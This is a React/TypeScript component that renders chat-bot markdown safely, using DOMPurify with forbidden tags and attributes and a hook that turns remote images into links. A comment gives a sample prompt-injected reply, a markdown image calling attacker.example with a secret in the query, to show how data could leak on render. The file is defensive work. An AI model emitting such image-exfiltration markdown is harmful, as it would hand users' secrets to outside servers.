import { useMemo } from "react";
import DOMPurify from "dompurify";
import { Marked, marked } from "marked";
import { highlight, useHighlighter } from "../lib/highlight";

marked.setOptions({ breaks: true, gfm: true });

// Fenced code blocks: the renderer leaves an empty placeholder and collects the code, so the
// block's text never passes through the HTML pipeline. After sanitizing, each placeholder becomes
// Shiki's (escaped) HTML, or the escaped text while its language loads or if it is unknown.
type CodeBlock = { lang: string; text: string };
let collecting: CodeBlock[] = [];
const messageMarked = new Marked({ breaks: true, gfm: true }, {
  renderer: {
    code({ text, lang }) {
      collecting.push({ lang: (lang ?? "").trim().split(/\s+/)[0] ?? "", text });
      return `<pre data-ob-code="${collecting.length - 1}"></pre>\n`;
    },
  },
});
const PLACEHOLDER = /<pre data-ob-code="(\d+)"><\/pre>/g;

const escapeHtml = (text: string) =>
  text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");

function codeBlockHtml(block: CodeBlock | undefined): string {
  if (!block) return "";
  const highlighted = block.lang ? highlight(block.text.replace(/\n$/, ""), block.lang) : null;
  if (highlighted) return `<div class="code-block" data-lang="${escapeHtml(block.lang)}">${highlighted}</div>`;
  return `<pre><code>${escapeHtml(block.text)}</code></pre>`;
}

function pointsOutsideApp(href: string): boolean {
  try {
    return new URL(href, window.location.href).origin !== window.location.origin;
  } catch {
    return false;
  }
}

function loadsFromElsewhere(src: string): boolean {
  try {
    const url = new URL(src, window.location.href);
    return url.protocol !== "data:" && url.protocol !== "blob:" && url.origin !== window.location.origin;
  } catch {
    return true;
  }
}

function openInNewTab(link: Element) {
  link.setAttribute("target", "_blank");
  link.setAttribute("rel", "noopener noreferrer");
}

// A link in a message that points outside the app opens in a new tab rather than navigating the
// thread away. The desktop app routes new-tab requests to the system browser (electron/main.cjs).
// The hook runs after sanitizing, so DOMPurify has already dropped unsafe hrefs such as javascript:.
//
// A remote image would load as soon as the message renders, so a prompt-injected reply such as
// ![](https://attacker.example/?d=<secret>) could hand data to any server without anyone clicking.
// It becomes a link instead; following it is the reader's decision. The backend's CSP
// (img-src 'self' data: blob:) blocks anything that gets past this.
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "IMG") {
    node.removeAttribute("srcset");
    const src = node.getAttribute("src");
    if (src && loadsFromElsewhere(src)) {
      const link = node.ownerDocument.createElement("a");
      link.setAttribute("href", src);
      openInNewTab(link);
      let host = src;
      try { host = new URL(src, window.location.href).host; } catch { /* keep the raw text */ }
      link.textContent = `[image: ${node.getAttribute("alt") || host}]`;
      node.replaceWith(link);
    }
    return;
  }
  const href = node.tagName === "A" ? node.getAttribute("href") : null;
  if (href && pointsOutsideApp(href)) openInNewTab(node);
});

function parse(content: string): { html: string; blocks: CodeBlock[] } {
  collecting = [];
  try {
    const html = DOMPurify.sanitize(messageMarked.parse(content) as string, {
      USE_PROFILES: { html: true },
      // Media tags load their sources on render, like remote images; bot messages have no use for them.
      FORBID_TAGS: ["style", "script", "iframe", "object", "embed", "form", "audio", "video", "source", "picture", "track"],
      FORBID_ATTR: ["style", "onerror", "onclick", "onload"],
    });
    return { html, blocks: collecting };
  } finally {
    collecting = [];
  }
}

export default function MarkdownContent({ content }: { content: string }) {
  const parsed = useMemo(() => parse(content), [content]);
  // Re-renders this message once one of its languages has loaded; the substitution is cheap.
  useHighlighter(parsed.blocks.map(b => b.lang));
  const html = parsed.html.replace(PLACEHOLDER, (_, index: string) => codeBlockHtml(parsed.blocks[Number(index)]));
  return <div className="markdown-content text-sm" dangerouslySetInnerHTML={{ __html: html }} />;
}
